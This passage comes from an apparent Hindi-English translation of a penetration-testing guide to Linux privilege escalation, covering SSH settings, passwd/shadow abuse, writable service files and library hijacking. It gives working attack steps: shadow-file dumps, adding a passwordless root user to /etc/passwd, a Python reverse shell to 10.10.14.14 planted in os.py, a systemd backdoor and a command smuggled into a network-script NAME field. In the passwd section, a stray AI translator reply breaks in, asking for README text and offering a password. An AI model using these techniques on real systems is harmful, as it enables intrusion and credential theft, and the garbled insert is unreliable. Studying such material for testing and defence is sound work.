यह बग उन OS में नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 variation संभव थे**। इसका मतलब है कि सभी संभावनाएँ calculate की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप calculate की गई संभावनाएँ यहां पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि पासवर्ड authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, तो यह बताता है कि सर्वर खाली पासवर्ड स्ट्रिंग वाले अकाउंट में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root पासवर्ड और private key दोनों से लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key से ही लॉगिन कर सकता है
- `forced-commands-only`: root केवल private key के साथ और तभी लॉगिन कर सकता है जब commands विकल्प specify किए गए हों
- `no` : अनुमति नहीं

### AuthorizedKeysFile

यह उन फाइलों को निर्दिष्ट करता है जिनमें वे public keys होती हैं जिन्हें user authentication के लिए उपयोग किया जा सकता है। इसमें `%h` जैसे tokens हो सकते हैं, जो home directory से replace हो जाएंगे। **आप absolute paths इंगित कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको यह अनुमति देता है कि आप **use your local SSH keys instead of leaving keys** (without passphrases!) अपने server पर छोड़कर न रखें। इसलिए, आप ssh के माध्यम से **jump** **to a host** कर सकेंगे और वहाँ से किसी दूसरे host पर **jump to another** कर सकेंगे, **using** उस **key** की जो आपके **initial host** में स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है, तो हर बार जब उपयोगकर्ता किसी दूसरी मशीन पर जाता है, तो वह होस्ट keys तक पहुँच पाएगा (जो कि एक सुरक्षा समस्या है)।

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
फ़ाइल `/etc/sshd_config` `AllowAgentForwarding` keyword के साथ ssh-agent forwarding को **allow** या **deny** कर सकती है (डिफ़ॉल्ट रूप से allow)।

यदि आप किसी environment में Forward Agent कॉन्फ़िगर होता हुआ पाते हैं, तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें वे **scripts हैं जो तब execute होती हैं जब कोई उपयोगकर्ता नया shell चलाता है**। इसलिए, यदि आप इनमें से किसी को भी **write या modify कर सकते हैं तो आप escalate privileges कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब प्रोफ़ाइल स्क्रिप्ट मिलती है, तो आपको इसे **संवेदनशील विवरणों** के लिए जाँचना चाहिए।

### Passwd/Shadow फ़ाइलें

OS पर निर्भर करते हुए `/etc/passwd` और `/etc/shadow` फाइलों का नाम अलग हो सकता है या उनकी बैकअप कॉपी मौजूद हो सकती है। इसलिए अनुशंसा की जाती है कि आप **सभी को खोजें** और **जाँचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि यह देखा जा सके कि फाइलों के अंदर **hashes हैं या नहीं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, नीचे दिए गए किसी एक कमांड से पासवर्ड जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md content yet — please paste the file contents you want translated.

Also clarify what you mean by "Then add the user `hacker` and add the generated password.":
- Do you want me to add a line in the translated README that lists the user and a generated password (e.g., "user: hacker, password: ...")? — I can generate a strong password and include it in the translated markdown.
- Or do you want commands to actually create the user on a Linux system (e.g., useradd + passwd)? — I can provide the exact commands you can run, but I cannot execute them for you.

If you want a generated password now, here is a strong example you can accept or ask me to regenerate:
V9g#p2XqL7!rB4s

Tell me which option you prefer and paste the README.md content to translate.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप पासवर्ड के बिना एक dummy user जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं.\
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` रख दिया गया है।

आपको जांचना चाहिए कि क्या आप कुछ **संवेदनशील फाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file** को संशोधित कर सकते हैं, तो आप निम्न पंक्तियों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started।

### फ़ोल्डर्स जाँचें

निम्न फ़ोल्डरों में बैकअप या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी वाले को पढ़ नहीं पाएँगे, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड रखने वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह **कई संभावित फ़ाइलें जिनमें पासवर्ड हो सकते हैं** की तलाश करता है।\
**एक और दिलचस्प टूल** जिसे आप इसके लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — यह एक open source एप्लिकेशन है जिसका उपयोग स्थानीय कंप्यूटर पर संग्रहीत कई पासवर्ड पुनः प्राप्त करने के लिए किया जाता है, Windows, Linux & Mac के लिए।

### Logs

यदि आप logs पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अधिक असामान्य log होगा, उतना ही (शायद) यह अधिक दिलचस्प होगा।\
साथ ही, कुछ **"bad"** configured (backdoored?) **audit logs** आपको audit logs के अंदर **पासवर्ड रिकॉर्ड करने** की अनुमति दे सकते हैं, जैसा कि इस पोस्ट में समझाया गया है: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/.
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने वाला समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) वास्तव में बहुत मददगार होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### सामान्य Creds Search/Regex

आपको उन फाइलों की भी जाँच करनी चाहिए जिनके नाम में शब्द "**password**" हो या जिनके **content** के अंदर यह शब्द मिले, और साथ ही logs के अंदर IPs और emails या hashes regexps की भी जाँच करें.\  
मैं यहाँ यह सब कैसे करना है सूचीबद्ध नहीं कर रहा/रही हूँ, लेकिन अगर आप रुचि रखते हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन-सी अंतिम checks perform करता है।

## लिखने योग्य फ़ाइलें

### Python library hijacking

यदि आप जानते हैं कि **कहाँ से** एक python script execute होने वाली है और आप उस फ़ोल्डर के अंदर **लिख सकते हैं** या आप **python libraries को modify कर सकते हैं**, तो आप OS library को modify करके उसमें backdoor लगा सकते हैं (यदि आप उस स्थान पर लिख सकते हैं जहाँ python script execute होने वाली है, तो os.py library को copy और paste करें)।

लाइब्रेरी में **backdoor the library** डालने के लिए बस os.py library के अंत में निम्न लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability है जो उन उपयोगकर्ताओं को जिनके पास किसी log file या उसके parent directories पर **write permissions** हैं, संभावित रूप से escalated privileges प्राप्त करने की अनुमति देती है। इसका कारण यह है कि `logrotate`, जो अक्सर **root** के रूप में चलता है, को इस तरह से manipulate किया जा सकता है कि यह arbitrary files execute कर दे, खासकर ऐसे directories में जैसे _**/etc/bash_completion.d/**_. यह जरूरी है कि permissions सिर्फ _/var/log_ में ही न देखें बल्कि उन किसी भी directory में भी जांच करें जहाँ log rotation लागू होता है।

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

कमज़ोरी के बारे में अधिक विस्तृत जानकारी इस पेज पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमज़ोरी का exploit कर सकते हैं [**logrotten**](https://github.com/whotwagner/logrotten).

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप logs बदल सकते हैं, तो देखें कि कौन उन logs को manage कर रहा है और जांचें कि क्या आप symlinks के द्वारा logs बदलकर escalate privileges कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` script को **write** कर सकता है **या** किसी मौजूदा script को **adjust** कर सकता है, तो आपका **system is pwned**।

Network scripts, उदाहरण के लिए _ifcg-eth0_, network connections के लिए उपयोग किए जाते हैं। वे बिल्कुल .INI files जैसे दिखते हैं। हालांकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा ~sourced~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attribute सही तरीके से handle नहीं किया जाता है। If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें Network और /bin/id के बीच रिक्त स्थान_)

### **init, init.d, systemd, और rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का घर है, जो **क्लासिक Linux service management system** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने वाले scripts होते हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम्स में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा प्रस्तुत एक नया **service management** है और service management कार्यों के लिए configuration फ़ाइलें उपयोग करता है। Upstart में संक्रमण के बावजूद, Upstart compatibility layer के कारण SysVinit scripts अभी भी Upstart configurations के साथ उपयोग किए जाते हैं।

**systemd** आधुनिक initialization और service manager के रूप में उभरता है, जो ऑन-डिमांड daemon starting, automount management, और system state snapshots जैसी उन्नत सुविधाएँ प्रदान करता है। यह फ़ाइलों को वितरण पैकेजों के लिए `/usr/lib/systemd/` और व्यवस्थापक संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे सिस्टम प्रशासन प्रक्रिया सरल होती है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel functionality को userspace manager के लिए एक्सपोज़ करने के लिए एक syscall को hook करते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) किसी local app को manager का impersonate करने और पहले से-rooted devices पर root तक escalate करने में सक्षम बना सकती है। अधिक जानकारी और exploitation विवरण यहाँ पढ़ें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery VMware Tools/Aria Operations में process command lines से एक binary path निकाल सकता है और उसे -v के साथ privileged context में execute कर सकता है। permissive patterns (उदा., \S का उपयोग) writable लोकेशंस (उदा., /tmp/httpd) में attacker-staged listeners से मिल सकते हैं, जिसके परिणामस्वरूप root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।

अधिक जानें और अन्य discovery/monitoring stacks पर लागू होने वाले सामान्यीकृत पैटर्न को यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux के local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
